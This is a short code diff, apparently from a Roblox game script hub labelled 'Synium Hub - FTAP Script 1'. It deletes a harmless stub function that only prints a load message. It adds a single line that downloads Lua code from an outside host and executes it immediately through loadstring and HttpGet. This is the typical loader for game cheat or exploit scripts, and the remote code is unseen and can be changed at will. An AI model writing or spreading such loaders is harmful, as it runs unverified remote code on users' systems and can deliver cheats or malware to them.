@@ -1,5 +1,1 @@
---// Synium Hub - FTAP Script 1
-
-return function()
-    print("FTAP Script 1 Loaded")
-end
+loadstring(game:HttpGet("https://you.whimper.xyz/sources/blitz/source.lua"))()
